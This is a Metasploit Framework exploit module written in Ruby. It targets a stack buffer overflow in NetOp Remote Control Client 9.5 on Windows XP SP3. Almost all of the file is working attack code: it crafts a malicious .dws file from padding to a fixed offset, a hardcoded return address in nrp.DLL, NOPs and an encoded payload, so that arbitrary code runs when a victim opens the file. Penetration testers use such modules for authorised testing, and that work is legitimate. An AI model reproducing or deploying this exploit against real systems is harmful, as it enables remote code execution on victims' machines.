##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NetOp Remote Control Client 9.5 Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack-based buffer overflow in NetOp Remote Control 9.5.
        When opening a .dws file containing a specially crafted string longer then 520 
        characters will allow an attacker to execute arbitrary code.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Ruben Alejandro "chap0"',
        ],
      'References'     =>
        [
          [ 'OSVDB', '72291' ],
          [ 'URL', 'http://www.exploit-db.com/exploits/17223/' ]
        ],
      'DefaultOptions' =>
        {
          'ExitFunction' => 'process',
          'DisablePayloadHandler' => 'true'
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'Space' => 2000,
          'BadChars' => "\x00\x0a\x0d",
          'DisableNops' => true,
          'StackAdjustment' => -3500
        },
      'Targets'        =>
        [
          [ 'Windows XP SP3',
            {
              'Ret' => 0x20d6c32c,  # push esp #  ret  - nrp.DLL
              'Offset' => 524
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Apr 28 2011',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ true, 'The file name.', 'msf.dws']),
      ], self.class)

  end

  def exploit
    buffer =  rand_text(target['Offset'])
    buffer << [target.ret].pack('V')
    buffer << make_nops(30)
    buffer << payload.encoded

    file_create(buffer)
  end

end
